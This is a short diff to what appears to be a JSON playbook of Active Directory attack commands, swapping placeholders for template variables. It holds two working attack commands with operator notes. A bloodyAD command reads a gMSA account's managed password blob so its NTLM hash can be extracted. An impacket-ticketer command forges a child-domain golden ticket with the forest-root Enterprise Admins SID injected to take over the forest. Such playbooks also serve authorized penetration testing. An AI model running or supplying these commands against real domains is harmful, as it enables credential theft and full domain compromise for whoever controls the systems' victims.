@@ -2009,7 +2009,7 @@
         },
         {
           "tool": "bloodyAD",
-          "run": "bloodyAD --host {{target}} -d {{domain}} -u {{user}} -p '{{password}}' get object '<gmsa-sam>$' --attr msDS-ManagedPassword",
+          "run": "bloodyAD --host {{target}} -d {{domain}} -u {{user}} -p '{{password}}' get object '{{gmsa_account}}$' --attr msDS-ManagedPassword",
           "note": "If you count as an allowed principal, this hands back the password blob; extract the NTLM with a gMSA parser (gMSADumper, DSInternals, or a brief python struct unpack)."
         }
       ]
@@ -2800,7 +2800,7 @@
       "commands": [
         {
           "tool": "impacket-ticketer",
-          "run": "impacket-ticketer -nthash {{nthash}} -domain-sid {{domain_sid}} -domain {{domain}} -extra-sid <forest-root-sid>-519 administrator",
+          "run": "impacket-ticketer -nthash {{nthash}} -domain-sid {{domain_sid}} -domain {{domain}} -extra-sid {{forest_root_sid}}-519 administrator",
           "note": "Forge a golden ticket for the child domain with the forest-root Enterprise Admins SID (-519) in SID history. Unfiltered intra-forest trusts honor it → forest root."
         },
         {
